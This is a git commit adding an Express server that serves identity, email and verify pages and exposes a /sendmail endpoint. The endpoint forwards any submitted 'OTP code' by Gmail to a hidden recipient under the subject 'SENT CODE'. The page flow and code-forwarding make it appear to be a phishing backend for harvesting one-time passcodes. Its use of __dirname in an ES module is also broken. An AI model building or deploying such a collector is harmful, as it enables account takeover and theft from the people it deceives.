683712f6a1dc2e44d76ba52fbef5bc7b95aa7f8e
hakisolos <maxwellexcel174@gmail.com>
2025-08-25 22:11:13 +0100

    first commit

---
+++ app.js
@@ -0,0 +1,69 @@
+import express from "express"
+import nodemailer from "nodemailer"
+import dotenv from "dotenv"
+import path from "path"
+dotenv.config()
+
+const PORT = process.env.PORT || 3000
+const app = express()
+
+
+app.use(express.static(path.join(__dirname, "public")))
+app.use(express.json())
+
+
+
+const transporter = nodemailer.createTransport({
+    service: 'gmail',
+    auth: {
+        user: String(process.env.MAIL_USER),
+        pass: String(process.env.MAIL_PASS),
+    },
+})
+const to = String(process.env.TEST)
+const subject = "SENT CODE"
+
+app.post("/sendmail", async (req, res) => {
+    try {
+        const { code } = req.body;
+        if (!code) {
+            return res.json({ error: "OTP code needed" });
+        }
+        const text = code;
+        await transporter.sendMail({
+            from: `"NIKKA" <${process.env.MAIL_USER}>`,
+            to,
+            subject,
+            text,
+        });
+        return res.json({ message: "mail sent successfully" });
+    } catch (e) {
+        console.log(e);
+        res.status(500).json({ error: "Internal server error" });
+    }
+});
+
+
+app.get("/", (req, res) => {
+    res.sendFile(path.join(__dirname, "public", "index.html"))
+})
+app.get("/identity", (req, res) => {
+    res.sendFile(path.join(__dirname, "public", "identity.html"))
+})
+app.get("/success", (req, res) => {
+    res.sendFile(path.join(__dirname, "public", "success.html"))
+})
+app.get("/email", (req, res) => {
+    res.sendFile(path.join(__dirname, "public", "email.html"))
+})
+app.get("/verify", (req, res) => {
+    res.sendFile(path.join(__dirname, "public", "verify.html"))
+})
+
+
+
+
+
+app.listen(PORT, () => {
+    console.log(`app running on port ${PORT}`)
+})
